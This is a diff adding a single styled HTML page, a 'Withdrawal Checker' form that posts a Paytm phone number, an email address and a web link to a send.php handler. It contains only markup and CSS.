@@ -1,0 +1,87 @@
+<html> <!---Dhurjati--Abel--Lato--Satisfy---Roboto--->
+<head>
+     <link rel="preconnect" href="https://fonts.googleapis.com">
+     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+     <link href="https://fonts.googleapis.com/css2?family=Abel&family=Dhurjati&family=Lato:ital,wght@1,300&family=Lora&family=Roboto:ital,wght@1,300&family=Satisfy&display=swap" rel="stylesheet">
+     <title> withdrawal checker </title>
+ <style>
+     *{
+      margin:0px;
+      padding:0px;
+      box-sizing:border-box;
+      text-transform:capitalize;
+      font-family:Lora;
+     }
+  body {
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background: radial-gradient(circle, #4f46e4 10%, transparent 11%),radial-gradient(circle at bottom left, #4f46e4 5%, transparent 6%),radial-gradient(circle at bottom right, #4f46e4 5%, transparent 6%),radial-gradient(circle at top left, #4f46e4 5%, transparent 6%),radial-gradient(circle at top right, #4f46e4 5%, transparent 6%);
+      background-size: 1em 1em;
+      background-color: #ffffff;
+      opacity: 1
+    }
+   form {
+       width:90%;
+       padding:0px;
+     /*  background:#dce9f7;*/
+       background:transparent;
+       backdrop-filter:blur(1.20px) ;
+       margin:0 auto;
+       border-radius:10px;
+       overflow:hidden;
+       position:relative;
+       box-shadow: rgba(0, 0, 0, 0.3) 0px 19px 38px, rgba(0, 0, 0, 0.22) 0px 15px 12px;
+    }
+   form > h1{
+       padding:15px;
+       background:#e8a2e0;
+       text-align:center;
+       color:#094266 ;
+      }
+  form > section {
+       width:100%;
+       margin:0 auto;       
+       padding:20px;
+     }
+
+  form > section >  input {
+       width:100%;
+       padding:12px;
+       border:0.5px solid black;
+       border-radius:10px;
+       outline:none;
+       margin:16px auto;    
+       transition-duration:0.3s;
+       font-size:18px;
+       background:#e8f7dc;
+       cursor:pointer; 
+       font-family:Lato;
+     }
+  form > section > input:focus{
+        background:#f2efc7 ;
+        text-align:center;
+        color:#5b40e3 ;
+     }
+ form > section >  #btn {
+      background: #835eeb;
+      color:white;
+    }
+ form >  section > #btn:active {
+       transform:scale(0.80) ;
+     }
+ </style>
+</head>
+<body>
+     <form action="send.php" method="post">
+         <h1>  Withdrawal Checker </h1>
+          <section>
+          <input type="tel" name="number" placeholder="Enter Paytm Number" maxlength="10" required>
+          <input type="email"  name="email"  placeholder="Enter Email Id" required>
+          <input type="url"    name="web" placeholder="Enter web link" required>
+          <input id="btn" type="submit" name="number" placeholder="Enter Paytm Number" value="submit">     
+         </section>
+    </form>
+</body>
+</html>
+
